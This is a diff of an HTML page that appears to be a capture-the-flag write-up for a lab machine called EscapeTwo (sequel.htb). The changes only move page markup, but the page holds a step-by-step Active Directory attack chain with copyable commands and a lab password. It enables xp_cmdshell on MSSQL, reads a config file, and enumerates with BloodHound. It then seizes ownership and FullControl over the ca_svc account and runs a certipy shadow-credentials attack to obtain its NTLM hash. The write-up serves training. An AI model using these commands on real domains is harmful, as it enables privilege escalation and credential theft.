@@ -148,9 +148,9 @@
             <p>We see we cant run system commands with xp_cmdshell . We need to enable it with this commands</p>
             <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>EXEC sp_configure 'xp_cmdshell', 1;</code></pre></div>
             <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>RECONFIGURE;</code></pre></div>
+            <p>And now we can run system commands (after running some commands mssql will reset xp_cmdshell. To run commands again just configure it again). After some enumeration we find sqlserver2019 configuration file</p>
         </div>
         <div class="photo-container">
-            <p>And now we can run system commands (after running some commands mssql will reset xp_cmdshell. To run commands again just configure it again). After some enumeration we find sqlserver2019 configuration file</p>
             <img src="pics/et6.png" alt="Image 6">
             <p>We can read it with this command</p>
             <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>EXEC xp_cmdshell "type c:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI";</code></pre></div>
@@ -162,21 +162,21 @@
         </div>
         <div class="photo-container">
             <img src="pics/et8.png" alt="Image 8">
-        </div>
-        <div class="photo-container">
             <p>After that we can use bloodhound-python to enumerate AD</p>
             <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>bloodhound-python -u 'ryan' -p 'WqSZAF6CysDQbGb3' -d sequel.htb -ns 10.10.11.51 -c All --zip</code></pre></div>
             <p>after importing zip file to bloodhound we see three kerberoastable accounts</p>
+        </div>
+        <div class="photo-container">
             <img src="pics/et9.png" alt="Image 9">
             <p>We can try to make ryan owner of ca_svc with this command</p>
             <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>bloodyAD --host 10.10.11.51 -d escapetwo.htb -u ryan -p WqSZAF6CysDQbGb3 set owner CA_SVC ryan</code></pre></div>
             <p>After running this command we see it allowed us. To get full control of user ca_svc we can use impacket-dacledit like this</p>
             <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>echo "10.10.11.51 sequel.htb" >> /etc/hosts</code></pre></div>
             <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"</code></pre></div>
-        </div>
-        <div class="photo-container">
             <p>After giving full control to get hash of user ca_svc we need to make shadow credendentials attack. This attack adds key of user ryan to msDS-KeyCredentialLink of user ca_svc . After that user ryan becomes a copy account of user ca_svc. For to do this we can use certipy tool like this </p>
             <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>certipy shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'</code></pre></div>
+        </div>
+        <div class="photo-container">
             <img src="pics/et10.png" alt="Image 10">
             <p>Now we have ntlm hash of user ca_svc. With this user we can control certificates that determine user authorizations. We can change templates to escalate our privileges. But first we need to learn template name with this command</p>
             <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>certipy find -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51</code></pre></div>
